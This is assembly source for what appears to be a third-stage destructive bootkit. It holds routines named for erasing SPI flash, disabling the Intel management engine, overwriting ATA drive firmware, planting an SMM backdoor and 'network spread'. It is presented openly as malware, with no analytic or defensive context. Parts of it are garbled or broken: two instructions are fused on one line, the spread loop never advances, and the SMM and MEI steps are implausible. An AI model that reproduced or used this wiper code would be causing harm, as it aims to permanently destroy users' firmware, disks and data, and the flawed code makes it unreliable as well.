[BITS 16]
[ORG 0x4000]

dw 0xBEEF
dw 0xCAFE

start_stage3:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x4000
    sti

    call phase21_spi_total_erase
    call phase22_me_region_kill
    call phase23_ata_firmware_overwrite
    call phase24_smm_backdoor
    call phase25_network_spread

    cli
    hlt
    jmp $

phase21_spi_total_erase:
    pusha
    mov eax, 0x8000F800
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp eax, 0xFFFFFFFF
    je spi_total_exit
    add eax, 0x3800
    mov dx, ax
    mov eax, 0x00000002
    out dx, eax
    mov cx, 5000
spi_total_wait:
    in eax, dx
    test eax, 0x00008000
    jz spi_total_done
    loop spi_total_wait
spi_total_done:
    mov dx, ax
    sub dx, 0x0004
    in eax, dx
    and eax, 0xFFFFFFF0
    out dx, eax
spi_total_exit:
    popa
    ret

phase22_me_region_kill:
    pusha
    mov eax, 0x8000F000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je me_kill_exit
    mov eax, 0x8000F004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp eax, 0x00000000
    je me_kill_exit
    mov [mei_bar_local], eax
    mov dx, [mei_bar_local]
    add dx, 0x0004
    mov eax, 0x00000000
    out dx, eax
    mov dx, [mei_bar_local]
    add dx, 0x0008
    mov eax, 0x00000000
    out dx, eax
    mov dx, [mei_bar_local]
    add dx, 0x000C
    mov eax, 0x00000000
    out dx, eax
    mov cx, 1000
me_kill_wait:
    mov dx, [mei_bar_local]
    add dx, 0x0004
    in eax, dx
    test eax, 0x00000002
    jnz me_kill_send
    loop me_kill_wait
    jmp me_kill_exit
me_kill_send:
    mov di, me_kill_buffer
    mov dword [di], 0x4C494C4B
    mov dword [di+4], 0x5F454D5F
    mov dword [di+8], 0x49474552
    mov dword [di+12], 0x00004E4F
    mov dword [di+16], 0x00000000
    mov dword [di+20], 0x00000000
    mov dx, [mei_bar_local]
    mov eax, me_kill_buffer
    out dx, eax
    mov dx, [mei_bar_local]
    add dx, 0x0004
    mov eax, 0x00000018
    or eax, 0x80000000
    out dx, eax
me_kill_exit:
    popa
    ret

phase23_ata_firmware_overwrite:
    pusha    mov dl, 0x80
ata_fw_loop:
    push dx
    mov ah, 0x08
    int 0x13
    pop dx
    jc ata_fw_next
    mov dx, 0x01F6
    mov al, 0xA0
    out dx, al
    mov dx, 0x01F7
ata_fw_wait:
    in al, dx
    test al, 0x80
    jnz ata_fw_wait
    test al, 0x01
    jnz ata_fw_next
    mov dx, 0x01F7
    mov al, 0x92
    out dx, al
    mov dx, 0x01F2
    mov al, 0x01
    out dx, al
    mov dx, 0x01F3
    mov al, 0x00
    out dx, al
    mov dx, 0x01F4
    mov al, 0x00
    out dx, al
    mov dx, 0x01F5
    mov al, 0x07
    out dx, al
    mov dx, 0x01F7
ata_fw_wait2:
    in al, dx
    test al, 0x08
    jz ata_fw_wait2
    mov dx, 0x01F0
    mov cx, 256
ata_fw_write:
    mov ax, 0xFFFF
    out dx, ax
    loop ata_fw_write
ata_fw_next:
    inc dl
    cmp dl, 0x84
    jne ata_fw_loop
    popa
    ret

phase24_smm_backdoor:
    pusha
    mov eax, 0x000A0000
    mov [smm_code_addr], eax
    mov di, [smm_code_addr]
    mov byte [di], 0xEB
    mov byte [di+1], 0xFE
    mov al, 0x00
    out 0xB2, al
    mov al, 0xFF
    out 0xB3, al
    mov cx, 1000
smm_wait_loop:
    nop
    loop smm_wait_loop
    popa
    ret

phase25_network_spread:
    pusha
    mov ax, 0xC000
    mov es, ax
    mov di, 0x0000
net_scan_loop:
    cmp ax, 0xE000
    je net_done
    cmp word [es:di], 0xAA55
    jne net_next
    cmp byte [es:di+2], 0x20
    jne net_next
    mov word [es:di+3], 0x9090
net_next:
    add ax, 0x0080
    jmp net_scan_loop
net_done:
    popa
    ret

mei_bar_local dd 0
smm_code_addr dd 0
me_kill_buffer times 32 db 0